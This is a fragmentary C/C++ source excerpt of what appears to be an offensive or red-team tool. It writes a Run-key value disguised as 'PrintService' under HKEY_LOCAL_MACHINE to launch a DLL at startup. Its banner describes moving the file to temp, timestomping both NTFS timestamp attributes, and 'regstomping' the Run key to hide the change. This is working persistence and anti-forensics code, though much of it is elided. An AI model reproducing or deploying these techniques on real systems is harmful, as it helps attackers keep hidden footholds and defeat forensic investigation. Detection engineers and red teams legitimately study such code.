...
// modify
wchar_t strSoftwareKey[] = L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
...
wchar_t czRunValueName[] = L"PrintService";
TCHAR czExePath[] = _T("C:\\users\\bob\\desktop\\example.dll");
...
{
    HKEY hKey;
    LONG lnRes = RegOpenKeyEx(HKEY_LOCAL_MACHINE, subKey, 0, KEY_WRITE, &hKey);

    if (ERROR_SUCCESS == lnRes)
    {
        printf("Adding reg value with name: %ls\n", czRunValueName);
        printf("Adding reg value with data: %s\n", czExePath);
...
void regStomp()
{
    printf("setting reg key to value \n");
    setRunKeyVal();
...
{
    printf("============================================================================\n");
    printf("FileStomp & Regstomp: Move file to temp, timestomp, backc, updating both FILE_NAME & STANDARD_INFORMATION, add file to run key and regstomp run key \n");
    printf("============================================================================\n");
    printf("\n\n\n\n\n\n");
